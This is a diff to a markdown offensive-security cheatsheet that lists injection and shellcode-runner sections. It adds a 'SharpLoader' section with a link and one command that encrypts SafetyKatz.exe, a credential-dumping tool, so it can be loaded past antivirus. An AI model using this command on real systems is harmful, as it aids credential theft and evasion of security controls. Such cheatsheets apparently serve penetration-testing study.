@@ -13,6 +13,7 @@ A cheatsheet compiled so you have everything you need in one place. I'd like to 
 - [DLL_Injection](#DLL_Injection)
 - [Shellcode_Runner](#Shellcode_Runner)
 - [Process_injection](#Process_injection)
+- [SharpLoader](#SharpLoader)
 
 ## [Javascript](#Javascript)
 
@@ -524,6 +525,15 @@ IntPtr.Zero, 0, IntPtr.Zero);
     }
 }
 
+```
+<br>
+<br>
+
+## SharpLoader
+[Sharploader]('https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader')
+
+```csharp
+Invoke-SharpEncrypt -file C:\CSharpFiles\SafetyKatz.exe -password S3cur3Th1sSh1t -outfile C:\CSharpEncrypted\SafetyKatz.enc
 ```
 <br>
 <br>
